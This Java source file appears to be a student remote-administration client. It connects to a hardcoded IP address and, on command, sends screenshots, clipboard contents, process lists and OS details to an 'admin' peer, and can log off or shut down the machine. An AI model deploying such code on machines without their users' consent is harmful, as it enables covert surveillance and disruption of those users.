package com.csm.client;

import com.csm.Message;
import com.csm.SIModel;
import com.csm.model.OsHWModel;
import com.csm.systeminfo.ClipboardData;
import com.csm.systeminfo.OsHW;
import com.csm.systeminfo.Processes;
import com.fasterxml.jackson.annotation.JsonFormat;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.google.gson.Gson;
import oshi.SystemInfo;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.awt.image.RenderedImage;
import java.io.IOException;
import java.net.Socket;
import java.io.*;
import java.net.*;
import java.util.Base64;
import java.util.Scanner;

public class Client
{
    final static int ServerPort = 1234;
    static SystemInfo si = new SystemInfo();
    public static void main(String args[]) throws UnknownHostException, IOException
    {
        Scanner scn = new Scanner(System.in);

        // getting localhost ip
        InetAddress ip = InetAddress.getByName("26.84.204.9");

        // establish the connection
        Socket s = new Socket(ip, ServerPort);

        // obtaining input and out streams
        ObjectOutputStream dos = new ObjectOutputStream(s.getOutputStream());
        ObjectInputStream dis = new ObjectInputStream(s.getInputStream());


        // sendMessage thread
        Thread sendMessage = new Thread(new Runnable()
        {
            @Override
            public void run() {
                while (true) {

                    // read the message to deliver.
                    String msg = scn.nextLine();

                    try {
                        // write on the output stream
                        Message object = new Message();
                        object.command= Message.TAKE_SCREEN_SHOT;
                        object.data = "data";
                        object.toId = "admin";
                        dos.writeObject(object);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        });

        // readMessage thread
        Thread readMessage = new Thread(new Runnable()
        {
            @Override
            public void run() {

                while (!Thread.currentThread().isInterrupted()) {
                    try {
                        // read the message sent to this client
                        Message msg = (Message) dis.readObject();
                        System.out.println(msg.command);
                        Message object = new Message();
                        object.command = msg.command;
                        object.toId = "admin";
                        switch (msg.command){
                            case Message.TAKE_SCREEN_SHOT -> {
                                object.data = takeScreenShot();
                                dos.writeObject(object);
                            }
                            case Message.LOG_OUT -> {
                                Runtime.getRuntime().exec("shutdown -l");
                            }
                            case Message.SHUT_DOWN -> {
                                Runtime.getRuntime().exec("shutdown -s -t 5");
                            }case Message.GET_CLIPBOARD -> {
                                object.data = ClipboardData.getInst().getClipboardContents();
                                dos.writeObject(object);
                            }
                            case Message.GET_LIST_PROCESS -> {
                                object.data = Processes.getProcessInfo();
                                dos.writeObject(object);
                            }
                            case Message.KILL_PROCESS -> {
                                System.out.println("Taskkill /PID "+ msg.data +" /F");
                            }
                            case Message.GET_OS_INFO -> {
                                OsHWModel os = new OsHWModel();
                                os.setOSPreFix(OsHW.getOsPrefix(si));
                                os.setDisplay(OsHW.getDisplay(si));
                                os.setProc(OsHW.getProc(si));
                                object.data = new Gson().toJson(os).replace("\n","");
                                System.out.println(object.data);
                                dos.writeObject(object);
                            }
                            default -> {

                            }
                        }
                    } catch (IOException e) {
                        Thread.currentThread().interrupt();
                        System.err.println("Lỗi nè");
                        return;
                    } catch (ClassNotFoundException e){
                        System.err.println("Lỗi nè");
                        Thread.currentThread().interrupt();
                        return;
                    }
                }
            }
        });
        sendMessage.start();
        readMessage.start();

    }
    public static String imgToBase64String(final RenderedImage img, final String formatName)
    {
        final ByteArrayOutputStream os = new ByteArrayOutputStream();

        try
        {
            ImageIO.write(img, formatName, os);
            return Base64.getEncoder().encodeToString(os.toByteArray());
        }
        catch (final IOException ioe)
        {
            throw new UncheckedIOException(ioe);
        }
    }
    public static String takeScreenShot(){
        try {
            Robot r = new Robot();
            Rectangle capture =
                    new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage Image = r.createScreenCapture(capture);
            return imgToBase64String(Image,"png");
        } catch (AWTException e) {
            e.printStackTrace();
            return "";
        }
    }
    public static BufferedImage base64StringToImg(final String base64String) {
        try {
            return ImageIO.read(new ByteArrayInputStream(Base64.getDecoder().decode(base64String)));
        } catch (final IOException ioe) {
            throw new UncheckedIOException(ioe);
        }
    }
    public static String getInfo(SIModel si){
        return new Gson().toJson(si);
    }
    public static SIModel getSIModelfromJson(String json){
        return new Gson().fromJson(json,SIModel.class);
    }
}
